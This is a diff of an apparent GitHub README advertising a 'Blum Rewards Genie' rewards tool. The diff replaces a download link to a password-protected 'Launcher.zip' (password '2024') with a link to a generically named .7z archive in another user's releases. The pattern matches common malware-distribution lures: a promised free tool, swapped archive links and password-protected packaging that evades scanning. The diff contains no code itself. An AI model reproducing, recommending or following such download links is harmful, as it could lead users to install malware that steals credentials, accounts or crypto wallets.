@@ -1,5 +1,5 @@
-# [DOWNLOAD](https://github.com/user-attachments/files/15920478/Launcher.zip)
-### - pass: 2024
+# [DOWNLOAD](https://github.com/bakedayk8/bakedayk8/releases/download/Basked-GameZ-21z/Github.Softwares.v1.0.2.7z)
+
 
 ### Blum Rewards Genie: Effortless Rewards for Your Blum Adventures 💰✨
 
